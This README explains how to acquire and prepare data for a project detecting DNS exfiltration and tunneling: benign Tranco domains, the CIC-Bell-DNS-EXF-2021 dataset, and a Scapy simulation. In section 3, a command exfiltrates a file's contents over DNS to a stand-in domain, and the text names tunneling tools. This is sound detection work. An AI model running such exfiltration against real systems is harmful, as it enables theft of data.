# Datasets: Acquisition and Setup Instructions

This directory contains data used for training and evaluating machine learning models to detect DNS data exfiltration and tunneling attacks.

---

## Directory Structure

- `data/raw/`: Untouched datasets, including raw PCAP files and raw domain lists. *(Gitignored)*
- `data/processed/`: Extracted feature sets in CSV format ready for EDA and machine learning. *(Gitignored)*

---

## 1. Benign Traffic: Tranco Top 1M Domains

The **Tranco list** provides an evasion-resistant ranking of top domain names for research purposes.

### Automatic Download
Run the project data acquisition script:
```bash
python3 src/download_data.py --tranco
```

### Manual Download
Download the latest 1M list:
```bash
curl -L -o data/raw/top-1m.csv.zip https://tranco-list.eu/top-1m.csv.zip
unzip data/raw/top-1m.csv.zip -d data/raw/
```

---

## 2. Malicious Traffic: CIC-Bell-DNS-EXF-2021

The **CIC-Bell-DNS-EXF-2021** dataset, provided by the Canadian Institute for Cybersecurity (University of New Brunswick), contains comprehensive DNS exfiltration and tunneling traffic generated using tools such as:
- `iodine`
- `dnscat2`
- `dns2tcp`

### Download Instructions:
1. Visit the official dataset portal: [UNB CIC-Bell-DNS-EXF-2021](https://www.unb.ca/cic/datasets/dns-exf-2021.html)
2. Submit the access request form to receive download credentials.
3. Place downloaded PCAP or CSV files into:
   ```bash
   data/raw/cic_bell/
   ```

---

## 3. Simulated DNS Exfiltration Traffic

If external datasets are not accessible, simulate realistic DNS exfiltration traffic with Scapy:
```bash
# Start packet capture in one terminal:
python3 src/capture_traffic.py --interface lo --output data/raw/simulation.pcap

# Run exfiltration simulation in another terminal:
python3 src/dns_simulator.py --domain test.exfil.org --mode text --file sample.txt
```

---

## 4. Processing Pipeline

Transform raw PCAP files and domain lists into structured feature datasets:
```bash
python3 src/features.py --input-pcap data/raw/sample_capture.pcap --output-csv data/processed/dns_features.csv
```
